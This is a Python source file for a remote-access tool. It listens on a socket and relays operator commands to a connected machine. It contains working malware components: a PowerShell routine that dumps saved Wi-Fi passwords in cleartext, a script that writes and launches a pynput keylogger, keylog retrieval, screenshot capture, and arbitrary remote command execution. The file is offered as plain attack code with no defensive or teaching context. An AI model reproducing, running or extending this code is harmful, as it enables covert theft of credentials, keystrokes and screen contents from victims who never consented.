import socket
import subprocess
import os
import threading
from PIL import ImageGrab

keylogger_process = None

def send_wifi_passwords():
    powershell_command = """
    $wifiProfiles = netsh wlan show profiles | Select-String "\\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
    $wifiDetails = ""
    foreach ($profile in $wifiProfiles) {
        $details = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content\\W+\\:(.+)$"
        if ($details) {
            $password = $details.Matches.Groups[1].Value.Trim()
            $wifiDetails += "SSID: $profile, Password: $password`n"
        }
    }
    $wifiDetails | Out-File -FilePath wifi_passwords.txt
    """
    subprocess.run(["powershell", "-Command", powershell_command], capture_output=True)

    with open("wifi_passwords.txt", "r") as file:
        wifi_passwords = file.read()

    return wifi_passwords

def start_keylogger():
    global keylogger_process
    keylogger_script = """
import pynput.keyboard

def on_press(key):
    with open("keylogs.txt", "a") as log:
        log.write(str(key) + "")

# Write the initial log message
with open("keylogs.txt", "w") as log:
    log.write("Keylogger started")

# Set up the listener
listener = pynput.keyboard.Listener(on_press=on_press)
listener.start()
listener.join()

    """
    with open("keylogger.py", "w") as file:
        file.write(keylogger_script)
    keylogger_process = subprocess.Popen(["python", "keylogger.py"])

def stop_keylogger():
    global keylogger_process
    if keylogger_process is not None:
        keylogger_process.terminate()
        keylogger_process = None
        return "Keylogger stopped."
    else:
        return "Keylogger is not running."

def retrieve_keylogs():
    with open("keylogs.txt", "r") as file:
        keylogs = file.read()
    return keylogs

def take_screenshot():
    screenshot = ImageGrab.grab()
    screenshot.save("screenshot.png")
    with open("screenshot.png", "rb") as file:
        screenshot_data = file.read()
    return screenshot_data

def handle_client(conn):
    while True:
        command = input("Shell> ")
        if command == "exit":
            break
        elif command == "wifi_dump":
            wifi_passwords = send_wifi_passwords()
            conn.send(wifi_passwords.encode())
        elif command == "start_keylogger":
            output = subprocess.getoutput("pip install pynput")
            conn.send(output.encode())
            start_keylogger()
            conn.send(b"Keylogger started.\n")
        elif command == "stop_keylogger":
            response = stop_keylogger()
            conn.send(response.encode())
        elif command == "retrieve_keylogs":
            keylogs = "type keylogs.txt"
            conn.send(keylogs.encode())
            response = conn.recv(1024).decode()
            print(response)
        elif command == "take_screenshot":
            screenshot_data = take_screenshot()
            conn.sendall(screenshot_data)
            conn.send(b"\nScreenshot sent.\n")
        else:
            
            conn.send(command.encode())
            response = conn.recv(1024).decode()
            print(response)

    conn.close()

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("", 12345))
    s.listen(1)
    print("Listening for incoming connections...")

    conn, addr = s.accept()
    print(f"Connection established with {addr}")

    client_handler = threading.Thread(target=handle_client, args=(conn,))
    client_handler.start()



if __name__ == "__main__":
    main()

